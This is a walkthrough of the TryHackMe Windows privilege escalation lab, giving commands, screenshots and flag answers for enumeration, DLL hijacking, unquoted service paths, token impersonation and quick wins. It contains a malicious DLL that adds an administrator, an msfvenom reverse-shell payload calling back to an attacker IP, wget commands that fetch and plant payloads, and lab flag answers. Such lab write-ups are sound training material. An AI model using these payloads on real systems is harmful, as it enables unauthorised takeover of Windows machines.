# Windows Privesc

{% embed url="https://tryhackme.com/room/winprivesc" %}
https://tryhackme.com/room/winprivesc
{% endembed %}

## Task 2 Information Gathering

#### List users on the target system. One of them resembles a flag.

```bash
net users
```

![](<../../.gitbook/assets/Screenshot from 2022-04-14 06-17-17.png>)

{% hint style="success" %}
`THM-17213`
{% endhint %}

#### What is the OS version of the target machine?

```bash
systeminfo | findstr /B /C:"OS"
```

![](<../../.gitbook/assets/Screenshot from 2022-04-14 06-18-44.png>)

{% hint style="success" %}
`10.0.17763 N/A Build 17763`
{% endhint %}

#### When was security update KB4562562 installed?

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr KB4562562
```

![](<../../.gitbook/assets/Screenshot from 2022-04-14 06-20-33.png>)

{% hint style="success" %}
`6/10/2020`
{% endhint %}

#### What is the state of Windows Defender?

```bash
sc query windefend
```

![](<../../.gitbook/assets/Screenshot from 2022-04-14 06-23-25.png>)

{% hint style="success" %}
`STOPPED`
{% endhint %}

## Task 4 Vulnerable Software

#### What version of a Fitbit application can you see installed?

```bash
wmic product get name,version,vendor
```

![](<../../.gitbook/assets/Screenshot from 2022-04-14 06-41-31.png>)

{% hint style="success" %}
`2.0.1.6782`
{% endhint %}

#### What kind of vulnerability seems to affect the Fitbit application?

![](<../../.gitbook/assets/Screenshot from 2022-04-14 06-42-19.png>)

{% hint style="success" %}
`Unquoted Service Path`
{% endhint %}

#### What version of FoxitReader is installed on the target system?

```bash
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate `
| Format-Table –AutoSize
```

![](<../../.gitbook/assets/Screenshot from 2022-04-14 06-48-15.png>)

{% hint style="success" %}
`9.0.1.1049`
{% endhint %}

## Task 5 DLL Hijacking

![](<../../.gitbook/assets/image (7) (1).png>)

#### Replicate the example explained above on the target machine.&#x20;

```bash
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc hijackme.c -shared -o /var/www/html/hijackme.dll    
```

#### Modify the payload to change the password of the user jack

```bash
wget http://10.6.9.176/hijackme.dll -OutFile hijackme.dll
sc stop dllsvc & sc start dllsvc 
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-08-15.png>)

#### Login with Jack's account (the new password you have set). What is the content of the flagdll.txt file?

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-09-16.png>)

{% hint style="success" %}
`THM-8377492093`
{% endhint %}

## Task 6 Unquoted Service Path

we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1. Being able to write to a folder on the path
2. Being able to restart the service

#### What is the full unquoted path of unquotedsvc

```bash
wmic service get name,displayname,pathname,startmode
sc qc unquotedsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-24-15.png>)

{% hint style="success" %}
`C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
{% endhint %}

#### Go through subfolders in the unquotedsvc binary path. Which folder does the user have read and write privileges on?

```bash
Desktop\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
Desktop\accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-29-44.png>)

{% hint style="success" %}
`C:\Program Files\Unquoted Path Service`
{% endhint %}

#### What would be the name of the executable you would place in that folder?

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.9.176 -f exe \
         -o /var/www/html/unquotedpathservice.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-32-25.png>)

```bash
cd C:\Program Files\Unquoted Path Service
wget http://10.6.9.176/unquotedpathservice.exe -OutFile common.exe
sc.exe stop unquotedsvc; sc.exe start unquotedsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-46-00.png>)

{% hint style="success" %}
`common.exe`
{% endhint %}

#### Obtain Administrator privileges on the target machine. What is the content of the flagUSP.txt file?

```bash
dir /S flagUSP.txt
type C:\Users\Cora\Documents\flagUSP.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-55-56.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-56-32.png>)

{% hint style="success" %}
`THM-636729273483`
{% endhint %}

## Task 7 Token Impersonation

Higher privileged service accounts will be forced to authenticate to a local port we listen on. Once the service account attempts to authenticate, this request is modified to negotiate a security token for the "NT AUTHORITY\SYSTEM" account. The security token obtained can be used by the user we have in a process called "impersonation".

### Hot Potato

* Step 1: The target system uses the Web Proxy Auto-Discovery (WPAD) protocol to locate its update server.&#x20;
* Step 2: This request is intercepted by the exploit, which sends a response redirecting the target system to a port on 127.0.0.1.&#x20;
* Step 3: The target system will ask for a proxy configuration file (wpad.dat).&#x20;
* Step 4: A malicious wpad.dat file is sent to the target.

![](<../../.gitbook/assets/image (8) (1).png>)

* Step 5: The target system tries to connect to the proxy (now set by the malicious wpad.dat file sent on the previous step).&#x20;
* Step 6: The exploit will ask the target system to perform an NTLM authentication.&#x20;
* Step 7: The target system sends an NTLM handshake.&#x20;
* Step 8: The handshake received is relayed to the SMB service with a request to create a process. This process will have the privilege level of the service targeted, which would typically be "NT AUTHORITY\SYSTEM".

![](<../../.gitbook/assets/image (6).png>)

## Task 8 Quick Wins

* **Scheduled Tasks**
*   **AlwaysInstallElevated**

    ```
    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    ```

    ```
    msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
    ```
* Passwords
*   Saved Credentials

    ```
    cmdkey /list
    runas /savecred /user:admin reverse_shell.exe
    ```
*   **Registry keys**

    ```
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    ```
* **Unattend files**
  * Unattend.xml files helps system administrators setting up Windows systems.

## Reference

{% embed url="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order" %}

{% embed url="https://steflan-security.com/windows-privilege-escalation-dll-hijacking" %}
